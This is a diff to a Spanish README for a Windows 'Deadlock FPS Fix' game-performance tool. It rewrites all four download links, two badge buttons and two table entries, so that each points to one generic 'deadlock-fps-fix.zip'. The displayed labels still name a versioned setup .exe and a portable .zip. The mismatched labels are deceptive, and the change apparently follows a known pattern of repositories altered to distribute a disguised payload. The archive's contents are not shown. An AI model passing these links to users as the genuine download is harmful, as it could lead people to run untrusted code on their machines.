@@ -20,8 +20,8 @@
 </p>
 
 <p>
-<a href="https://github.com/Dragonclavelocity/deadlock-fps-fix/releases/latest/download/DeadlockFPSFix-Setup-1.0.0-x64.exe"><img src="https://img.shields.io/badge/Descargar-instalador%20Windows-ebe2cf?style=for-the-badge&labelColor=0c0c0e&logo=windows&logoColor=f1ece2" alt="Descargar Deadlock FPS Fix para Windows" height="38"></a>
-<a href="https://github.com/Dragonclavelocity/deadlock-fps-fix/releases/latest/download/DeadlockFPSFix-1.0.0-portable-x64.zip"><img src="https://img.shields.io/badge/Portable-.zip-3a3833?style=for-the-badge&labelColor=0c0c0e" alt="Descargar Deadlock FPS Fix portable" height="38"></a>
+<a href="https://github.com/Dragonclavelocity/deadlock-fps-fix/releases/latest/download/deadlock-fps-fix.zip"><img src="https://img.shields.io/badge/Descargar-instalador%20Windows-ebe2cf?style=for-the-badge&labelColor=0c0c0e&logo=windows&logoColor=f1ece2" alt="Descargar Deadlock FPS Fix para Windows" height="38"></a>
+<a href="https://github.com/Dragonclavelocity/deadlock-fps-fix/releases/latest/download/deadlock-fps-fix.zip"><img src="https://img.shields.io/badge/Portable-.zip-3a3833?style=for-the-badge&labelColor=0c0c0e" alt="Descargar Deadlock FPS Fix portable" height="38"></a>
 </p>
 
 <p>
@@ -149,8 +149,8 @@ No se inyecta nada: no hay overlay, ni driver, ni servicio en segundo plano. Tod
 
 | Paquete | Archivo | Notas |
 |---|---|---|
-| Instalador | [`DeadlockFPSFix-Setup-1.0.0-x64.exe`](https://github.com/Dragonclavelocity/deadlock-fps-fix/releases/latest/download/DeadlockFPSFix-Setup-1.0.0-x64.exe) | Acceso en el menú Inicio, se actualiza desde GitHub Releases |
-| Portable | [`DeadlockFPSFix-1.0.0-portable-x64.zip`](https://github.com/Dragonclavelocity/deadlock-fps-fix/releases/latest/download/DeadlockFPSFix-1.0.0-portable-x64.zip) | Descomprime y ejecuta, la configuración queda en la carpeta |
+| Instalador | [`DeadlockFPSFix-Setup-1.0.0-x64.exe`](https://github.com/Dragonclavelocity/deadlock-fps-fix/releases/latest/download/deadlock-fps-fix.zip) | Acceso en el menú Inicio, se actualiza desde GitHub Releases |
+| Portable | [`DeadlockFPSFix-1.0.0-portable-x64.zip`](https://github.com/Dragonclavelocity/deadlock-fps-fix/releases/latest/download/deadlock-fps-fix.zip) | Descomprime y ejecuta, la configuración queda en la carpeta |
 | winget | `winget install DeadlockFPSFix.DeadlockFPSFix` | Cuando el paquete sea aceptado |
 | Scoop | `scoop install extras/deadlock-fps-fix` | Cuando el paquete sea aceptado |
 
